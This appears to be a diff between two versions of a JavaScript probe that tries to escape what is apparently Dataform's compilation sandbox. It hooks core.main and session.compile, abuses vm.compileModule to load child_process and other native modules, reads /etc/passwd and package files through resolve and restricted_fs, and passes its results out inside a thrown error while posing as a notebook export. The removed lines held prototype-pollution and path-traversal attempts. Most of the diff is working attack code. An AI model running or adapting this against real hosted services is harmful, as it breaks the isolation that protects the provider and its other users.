@@ -1,4 +1,4 @@
-// v3 — vm.compileModule abuse + transpiler hook + core internals
+// v4 — find p.nativeRequire reachable, test what it resolves
 
 var out = {};
 function safe(k, fn) {
@@ -10,197 +10,170 @@ function safe(k, fn) {
   }
 }
 
-// ============ TIER A: vm.compileModule with proper 2-arg signature ============
-safe('A1_compileModule_2arg_iife', function() {
-  var c = vm.compileModule('attacker.js', '(() => 42)()');
-  return 'type=' + typeof c + ' src=' + String(c).substring(0,300);
-});
-
-safe('A2_compileModule_arrow_callable', function() {
-  // Mimics what require() does
-  var src = "((module, exports, __dirname, __filename) => { module.exports = { test: 42, dir: __dirname, file: __filename, env_keys: Object.keys(globalThis).slice(0,5).join(',') }; })";
-  var c = vm.compileModule('test.js', src);
-  if (typeof c === 'function') {
-    var mod = { exports: {} };
-    c(mod, mod.exports, '/test/dir', '/test/file.js');
-    return JSON.stringify(mod.exports);
-  }
-  return 'type=' + typeof c;
-});
-
-safe('A3_compileModule_eval_process', function() {
-  // Try to access host primitives through compileModule
-  var src = "((module) => { try { module.exports = { p: typeof process, b: typeof Buffer, r: typeof require, g: typeof global }; } catch(e) { module.exports = { err: e.message }; } })";
-  var c = vm.compileModule('probe.js', src);
-  var mod = { exports: {} };
-  c(mod, mod.exports, '/', '/probe.js');
-  return JSON.stringify(mod.exports);
-});
-
-safe('A4_compileModule_wrap_breakout', function() {
-  // Try to break out of typical wrap via source crafting
-  // If vm.compileModule is sensitive to balanced parens, source like `});\nactualPayload\n((module)=>{` might break out
-  var src = "((module) => { return 'inside'; });\nthrow new Error('BREAKOUT_TOP_LEVEL_EXECUTED');\n((m)=>{ return null; })";
-  try {
-    var c = vm.compileModule('escape.js', src);
-    return 'compiled type=' + typeof c + ' src=' + String(c).substring(0,200);
-  } catch(e) { return 'err:' + e.message; }
-});
-
-safe('A5_compileModule_strict_mode_check', function() {
-  // 'use strict' / let / class etc. — do these enable new primitives?
-  var src = "(() => { 'use strict'; class P { static get x() { return typeof process; } }; return P.x; })()";
-  var c = vm.compileModule('strict.js', src);
-  return 'src=' + String(c).substring(0,300);
-});
-
-// ============ TIER B: require.transpiler hook ============
-safe('B1_transpiler_hook_install', function() {
-  if (typeof require.transpiler !== 'function') return 'no_transpiler';
-  var orig = require.transpiler;
-  globalThis.__transpilerLog = [];
-  require.transpiler = function(source, filename) {
-    try {
-      globalThis.__transpilerLog.push({
-        f: filename,
-        len: source ? source.length : 0,
-        head: source ? String(source).substring(0,200) : null
-      });
-    } catch(e) {}
-    return orig.apply(this, arguments);
+// ============ TIER A: Hook core.main to capture closure context ============
+// core.main uses `p.nativeRequire` — we replace main with proxy that calls original
+// in a way that lets us inspect the call site
+safe('A1_hook_core_main', function() {
+  var origMain = core.main;
+  globalThis.__mainHookFired = false;
+  core.main = function(a) {
+    globalThis.__mainHookFired = true;
+    globalThis.__mainCallStack = new Error().stack;
+    globalThis.__mainArg = typeof a + ' len:' + (a ? String(a).length : 0);
+    // Walk through original's behavior — but we want to inject our own ops
+    return origMain.apply(this, arguments);
   };
-  return 'installed';
+  return 'hooked';
 });
 
-// ============ TIER C: @dataform/core deep ============
-safe('C1_core_compiler_keys', function() {
-  return Object.getOwnPropertyNames(core.compiler).join(',') + ' | proto:' + Object.getOwnPropertyNames(Object.getPrototypeOf(core.compiler) || {}).join(',');
+// ============ TIER B: vm.compileModule abuse — eval in bundle realm context ============
+// Now that we know vm.compileModule(name, src) executes top-level source:
+safe('B1_eval_in_compileModule_globals', function() {
+  // What globals are visible inside vm.compileModule's execution?
+  var src = "JSON.stringify({" +
+    "process: typeof process," +
+    "Buffer: typeof Buffer," +
+    "require: typeof require," +
+    "nativeRequire: typeof nativeRequire," +
+    "global: typeof global," +
+    "globalThis_keys: Object.getOwnPropertyNames(globalThis).join(',')," +
+    "core: typeof core," +
+    "session: typeof globalThis._DF_SESSION," +
+    "restricted_fs: typeof restricted_fs" +
+    "})";
+  return vm.compileModule('probe.js', src);
 });
-safe('C2_core_compiler_src', function() { return String(core.compiler).substring(0, 600); });
-safe('C3_core_session_keys', function() {
-  return Object.getOwnPropertyNames(core.session).join(',') + ' | proto:' + Object.getOwnPropertyNames(Object.getPrototypeOf(core.session) || {}).join(',');
-});
-safe('C4_core_session_src', function() { return String(core.session).substring(0, 800); });
-safe('C5_core_main_src', function() { return String(core.main).substring(0, 800); });
-safe('C6_core_indexFileGenerator_src', function() { return String(core.indexFileGenerator).substring(0, 800); });
-safe('C7_core_supportedFeatures', function() { return JSON.stringify(core.supportedFeatures); });
-safe('C8_core_version', function() { return String(core.version); });
 
-// ============ TIER D: create another core.session instance ============
-safe('D1_new_session_check', function() {
+safe('B2_eval_compileModule_require_natives', function() {
+  // From within compileModule, try to access native modules
+  var src = "try { var cp = require('child_process'); JSON.stringify({got: typeof cp, execSync: typeof cp.execSync}); } catch(e) { 'err: ' + e.message; }";
+  return vm.compileModule('require_test.js', src);
+});
+
+// ============ TIER C: resolve() global probe ============
+safe('C1_resolve_type', function() { return typeof resolve; });
+safe('C2_resolve_src', function() { return String(resolve).substring(0, 800); });
+safe('C3_resolve_workflow_settings', function() {
+  try { return String(resolve('workflow_settings.yaml', '.')); } catch(e) { return 'err:' + e.message; }
+});
+safe('C4_resolve_dataform_core', function() {
+  try { return String(resolve('@dataform/core', '.')); } catch(e) { return 'err:' + e.message; }
+});
+safe('C5_resolve_child_process', function() {
+  try { return String(resolve('child_process', '.')); } catch(e) { return 'err:' + e.message; }
+});
+safe('C6_resolve_absolute_path', function() {
+  try { return String(resolve('/etc/passwd', '.')); } catch(e) { return 'err:' + e.message; }
+});
+
+// ============ TIER D: bundled require WITH known good packages ============
+safe('D1_require_dataform_core_package_json', function() {
   try {
-    // session is probably a class — try instantiating
-    if (typeof core.session === 'function') {
-      var dummyConfig = { projectConfig: { warehouse: 'bigquery', defaultDatabase: 'pwn-via-new-session' }, rootDir: '.' };
-      var s = new core.session(dummyConfig);
-      return 'made session, keys=' + Object.getOwnPropertyNames(s).join(',');
-    }
-    return 'session not constructable, typeof=' + typeof core.session;
+    var pkg = require('@dataform/core/package.json');
+    return JSON.stringify(pkg).substring(0, 500);
+  } catch(e) { return 'err:' + e.message; }
+});
+safe('D2_require_dataform_core_bundle', function() {
+  try {
+    var b = require('@dataform/core/bundle.js');
+    return 'type=' + typeof b + ' keys=' + Object.keys(b||{}).slice(0,15).join(',');
+  } catch(e) { return 'err:' + e.message; }
+});
+safe('D3_require_protobufjs', function() {
+  try {
+    var pb = require('protobufjs');
+    return 'type=' + typeof pb + ' keys=' + Object.keys(pb||{}).slice(0,15).join(',');
+  } catch(e) { return 'err:' + e.message; }
+});
+safe('D4_require_protobufjs_minimal', function() {
+  try {
+    var pb = require('protobufjs/minimal');
+    return 'type=' + typeof pb + ' keys=' + Object.keys(pb||{}).slice(0,15).join(',');
   } catch(e) { return 'err:' + e.message; }
 });
 
-// ============ TIER E: O.dataform protobuf access ============
-// session.compile uses O.dataform.CompiledGraph.create — can we reach O?
-// Try via session.compile.toString() string extraction
-safe('E1_session_compile_str_search', function() {
+// ============ TIER E: Find module bindings via require.cache style ============
+// Bundled require uses 'f' as cache — see if we can find references
+// Even if we can't access f directly, maybe we can list known module paths
+safe('E1_known_modules_walk', function() {
+  var tries = ['@dataform/core', '@dataform/core/package.json', '@dataform/core/bundle.js', '@dataform/core/bundle', 'fs', 'path', 'os', 'child_process', 'process', 'module', 'vm', 'crypto', 'http', 'https', 'net', 'util', 'stream', 'events', 'querystring', 'url', 'dns', 'tls', 'cluster', 'buffer', 'console', 'timers', 'worker_threads', 'assert', 'inspector'];
+  var results = {};
+  for (var m of tries) {
+    try {
+      var x = require(m);
+      results[m] = 'GOT typeof=' + typeof x + (typeof x === 'object' ? ' keys=' + Object.keys(x||{}).slice(0,8).join(',') : '');
+    } catch(e) { results[m] = 'err:' + e.message.substring(0,80); }
+  }
+  return JSON.stringify(results);
+});
+
+// ============ TIER F: restricted_fs broader probing ============
+safe('F1_rfs_root', function() {
+  try { return restricted_fs.readFile('.').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
+});
+safe('F2_rfs_node_modules_at_dataform_core', function() {
+  try { return restricted_fs.readFile('node_modules/@dataform/core/package.json').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
+});
+safe('F3_rfs_node_modules_bundle', function() {
+  try { return restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
+});
+safe('F4_rfs_dataform_json', function() {
+  try { return restricted_fs.readFile('dataform.json').toString().substring(0,500); } catch(e) { return 'err:' + e.message; }
+});
+
+// ============ TIER G: assert function — what does it actually do? ============
+safe('G1_assert_call_true', function() { try { assert(true); return 'ok'; } catch(e) { return 'err:' + e.message; } });
+safe('G2_assert_call_false', function() { try { assert(false, 'fail msg'); return 'ok-no-throw'; } catch(e) { return 'err:' + e.message; } });
+safe('G3_assert_keys_after_call', function() {
+  return Object.getOwnPropertyNames(assert).join(',');
+});
+
+// ============ TIER H: Direct manipulation — replace core.session.compile to capture p ============
+// Wait, p is closure of core.main, not session. But maybe session methods also have access to internal modules.
+safe('H1_session_compile_internal_refs', function() {
   var src = String(global._DF_SESSION.compile);
-  // Search for dataform.* references
-  var matches = src.match(/[a-zA-Z_$][\w$]*\.dataform\.[\w]+/g) || [];
-  return JSON.stringify(matches.slice(0, 30));
-});
-safe('E2_session_test_for_O', function() {
-  // The local variable 'O' in compile is a closure. Try to leak it via call patterns.
-  // Replace compile with a function that captures 'this' and arguments
-  var origCompile = global._DF_SESSION.compile;
-  globalThis.__capturedCompileCtx = null;
-  global._DF_SESSION.compile = function() {
-    try {
-      globalThis.__capturedCompileCtx = {
-        this_keys: Object.keys(this).slice(0,30),
-        args_count: arguments.length,
-        compile_str: String(origCompile).substring(0,1500)
-      };
-    } catch(e) { globalThis.__capturedCompileCtx = {err: e.message}; }
-    return origCompile.apply(this, arguments);
-  };
-  return 'hooked compile, will capture on next call';
+  // Find all single-letter identifiers (likely modules)
+  var modules = src.match(/\b[a-z]\b\./g) || [];
+  var unique = [...new Set(modules)].slice(0, 30);
+  return unique.join(',');
 });
 
-// ============ TIER F: prototype pollution via JSON / setters ============
-safe('F1_json_proto_pollution_attempt', function() {
-  try {
-    var poisoned = JSON.parse('{"__proto__":{"PWN":"VALUE"}}');
-    return 'parsed, Object.prototype.PWN=' + Object.prototype.PWN + ', proto.PWN=' + poisoned.PWN;
-  } catch(e) { return 'err:' + e.message; }
+safe('H2_session_compileGraphChunk_internal', function() {
+  var src = String(global._DF_SESSION.compileGraphChunk);
+  return src.substring(0, 2000);
 });
 
-safe('F2_object_setPrototypeOf', function() {
-  try {
-    var o = {};
-    Object.setPrototypeOf(o, { PWNED: true });
-    return 'set, o.PWNED=' + o.PWNED;
-  } catch(e) { return 'err:' + e.message; }
+// ============ TIER I: WebAssembly with valid bytecode ============
+safe('I1_wasm_compile', function() {
+  // Minimal valid wasm — exports add(a, b) returning i32
+  // (module
+  //   (func $add (param i32 i32) (result i32) local.get 0 local.get 1 i32.add)
+  //   (export "add" (func $add)))
+  var bytes = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
+    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f, // type section
+    0x03, 0x02, 0x01, 0x00, // function section
+    0x07, 0x07, 0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00, // export
+    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b // code
+  ]);
+  var m = new WebAssembly.Module(bytes);
+  var i = new WebAssembly.Instance(m, {});
+  return 'wasm add(3,4)=' + i.exports.add(3, 4);
 });
 
-// ============ TIER G: indexFileGenerator — what does it accept? ============
-safe('G1_indexFileGenerator_call', function() {
-  try {
-    var result = core.indexFileGenerator(['definitions/v.sqlx']);
-    return 'type=' + typeof result + ' val=' + String(result).substring(0,500);
-  } catch(e) { return 'err:' + e.message; }
+// ============ TIER J: Try every conceivable native module name via bundled require ============
+// AND via vm.compileModule's internal require
+safe('J1_compileModule_native_require_loop', function() {
+  var natives = ['fs', 'child_process', 'net', 'path', 'process', 'os', 'crypto', 'http', 'https', 'stream', 'tty', 'module', 'vm', 'worker_threads', 'inspector', 'v8', 'perf_hooks', 'async_hooks', 'cluster', 'tls', 'url', 'dns', 'querystring', 'string_decoder', 'punycode'];
+  var src = "var natives = " + JSON.stringify(natives) + ";\n" +
+    "var results = {};\n" +
+    "for (var n of natives) {\n" +
+    "  try { var r = require(n); results[n] = 'GOT keys=' + Object.keys(r||{}).slice(0,8).join(','); }\n" +
+    "  catch(e) { results[n] = 'err:' + e.message.substring(0,80); }\n" +
+    "}\n" +
+    "JSON.stringify(results)";
+  return vm.compileModule('native_loop.js', src);
 });
 
-safe('G2_indexFileGenerator_path_traversal', function() {
-  try {
-    var result = core.indexFileGenerator(['../../etc/passwd']);
-    return 'type=' + typeof result + ' val=' + String(result).substring(0,500);
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ TIER H: assert global — could be Node's assert with internal access ============
-safe('H1_assert_type', function() { return typeof assert; });
-safe('H2_assert_keys', function() { return typeof assert === 'function' ? 'fn:' + String(assert).substring(0,300) : Object.getOwnPropertyNames(assert).join(','); });
-
-// ============ TIER I: WebAssembly access — different compilation pathway ============
-safe('I1_wasm_compile_minimal', function() {
-  try {
-    // Minimal wasm module — exports a function that returns 42
-    var bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,7,1,3,one,0,0,10,6,1,4,0,65,42,11]);
-    return 'created bytes, len=' + bytes.length;
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ TIER J: Look for native bridged functions in any reachable object ============
-safe('J1_native_in_session', function() {
-  var found = [];
-  var s = global._DF_SESSION;
-  var keys = Object.getOwnPropertyNames(Object.getPrototypeOf(s));
-  for (var k of keys) {
-    try {
-      var v = s[k];
-      if (typeof v === 'function' && String(v).indexOf('[native code]') >= 0) {
-        found.push(k);
-      }
-    } catch(e) {}
-  }
-  return found.join(',');
-});
-
-safe('J2_native_in_core', function() {
-  var found = [];
-  var keys = Object.getOwnPropertyNames(core);
-  for (var k of keys) {
-    try {
-      var v = core[k];
-      if (typeof v === 'function' && String(v).indexOf('[native code]') >= 0) {
-        found.push(k);
-      }
-    } catch(e) {}
-  }
-  return found.join(',');
-});
-
-// Provide notebook shape
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
-
-throw new Error('PROBE_v3:' + JSON.stringify(out));
+throw new Error('PROBE_v4:' + JSON.stringify(out));
